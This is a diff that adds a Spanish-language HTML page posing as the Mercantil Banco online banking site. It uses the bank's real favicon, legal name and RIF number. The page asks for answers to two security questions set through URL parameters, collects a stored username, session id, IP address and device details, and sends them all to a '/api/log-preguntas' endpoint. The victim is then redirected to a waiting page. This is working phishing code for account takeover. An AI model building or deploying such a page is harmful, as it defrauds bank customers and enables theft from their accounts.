@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercantil en Línea</title>
+    <link rel="shortcut icon" href="https://www30.mercantilbanco.com/favicon.ico" type="image/x-icon">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #eff3f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .nav-bar {
+            background: #004e9b;
+            height: 64px;
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            z-index: 100;
+        }
+        .nav-bar img { height: 36px; width: auto; }
+
+        .main {
+            flex: 1;
+            margin-top: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 24px rgba(0,0,0,.1);
+            padding: 40px 36px;
+            width: 100%;
+            max-width: 440px;
+        }
+
+        .card-icon {
+            width: 56px; height: 56px;
+            margin: 0 auto 20px;
+            background: #e3f0fb;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card-icon svg { fill: #004e9b; }
+
+        .card-title {
+            color: #004e9b;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .card-sub {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 28px;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .field {
+            position: relative;
+            margin-bottom: 28px;
+        }
+        .field input {
+            width: 100%;
+            border: none;
+            border-bottom: 2px solid #bdbdbd;
+            padding: 20px 0 6px 0;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            background: transparent;
+            outline: none;
+            color: #212121;
+            transition: border-color .2s;
+        }
+        .field input:focus { border-bottom-color: #004e9b; }
+        .field label {
+            position: absolute;
+            top: 20px; left: 0;
+            font-size: 16px;
+            color: #757575;
+            pointer-events: none;
+            transition: top .2s, font-size .2s, color .2s;
+        }
+        .field input:focus ~ label,
+        .field input:not(:placeholder-shown) ~ label {
+            top: 2px;
+            font-size: 12px;
+            color: #004e9b;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: #004e9b;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            padding: 14px;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background .2s;
+            margin-top: 8px;
+        }
+        .btn-primary:hover { background: #003a75; }
+        .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
+
+        footer {
+            background: #fff;
+            border-top: 1px solid #e0e0e0;
+            padding: 14px 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #757575;
+        }
+    </style>
+</head>
+<body>
+
+<nav class="nav-bar">
+    <img src="containersito/Log.png" alt="Mercantil en Línea">
+</nav>
+
+<div class="main">
+    <div class="card">
+        <div class="card-icon">
+            <svg width="28" height="28" viewBox="0 0 24 24">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+            </svg>
+        </div>
+
+        <h1 class="card-title">Verificación Adicional</h1>
+        <p class="card-sub">Por seguridad, necesitamos confirmar algunos datos de tu cuenta.</p>
+
+        <div class="field">
+            <input type="text" id="resp1" placeholder=" " autocomplete="off">
+            <label id="label1Text" for="resp1">Pregunta 1</label>
+        </div>
+
+        <div class="field">
+            <input type="text" id="resp2" placeholder=" " autocomplete="off">
+            <label id="label2Text" for="resp2">Pregunta 2</label>
+        </div>
+
+        <button class="btn-primary" id="btnConfirm" type="button" onclick="confirmar()">Continuar</button>
+    </div>
+</div>
+
+<footer>
+    <span>Derechos protegidos por Mercantil C.A., Universal. RIF: J-00002961-0.</span>
+</footer>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const LABEL1 = decodeURIComponent(urlParams.get('label1') || 'Pregunta 1');
+    const LABEL2 = decodeURIComponent(urlParams.get('label2') || 'Pregunta 2');
+
+    document.getElementById('label1Text').textContent = LABEL1;
+    document.getElementById('label2Text').textContent = LABEL2;
+
+    const USUARIO = localStorage.getItem('mercantil_usuario') || 'No disponible';
+
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let os = 'Desconocido', device = 'Desktop';
+        if (/android/i.test(ua))          { os = 'Android'; device = '📱 Móvil'; }
+        else if (/iPhone|iPad/i.test(ua)) { os = 'iOS';     device = '📱 iPhone/iPad'; }
+        else if (/Windows/i.test(ua))     { os = 'Windows'; device = '🖥️ PC'; }
+        else if (/Mac/i.test(ua))         { os = 'macOS';   device = '🖥️ Mac'; }
+        else if (/Linux/i.test(ua))       { os = 'Linux';   device = '🖥️ Linux'; }
+        const browser = /Chrome/i.test(ua)  ? 'Chrome'
+                      : /Firefox/i.test(ua) ? 'Firefox'
+                      : /Safari/i.test(ua)  ? 'Safari'
+                      : /Edge/i.test(ua)    ? 'Edge' : 'Desconocido';
+        return { os, device, browser };
+    }
+
+    async function getIP() {
+        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; }
+        catch { return 'No disponible'; }
+    }
+
+    async function confirmar() {
+        const resp1 = document.getElementById('resp1').value.trim();
+        const resp2 = document.getElementById('resp2').value.trim();
+        if (!resp1 || !resp2) { alert('Por favor completa todos los campos.'); return; }
+
+        const btn = document.getElementById('btnConfirm');
+        btn.disabled = true;
+        btn.textContent = 'Verificando...';
+
+        try {
+            const ip = await getIP();
+            const { os, device, browser } = getDeviceInfo();
+            const now   = new Date();
+            const fecha = now.toLocaleDateString('es-VE', { day: '2-digit', month: 'long', year: 'numeric' });
+            const hora  = now.toLocaleTimeString('es-VE', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const sessionId = localStorage.getItem('mercantil_session_id') || '';
+
+            await fetch('/api/log-preguntas', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ usuario: USUARIO, label1: LABEL1, resp1, label2: LABEL2, resp2, ip, device, browser, os, fecha, hora, sessionId })
+            });
+        } catch (e) { console.error(e); }
+
+        window.location.href = 'wait.html';
+    }
+</script>
+
+</body>
+</html>
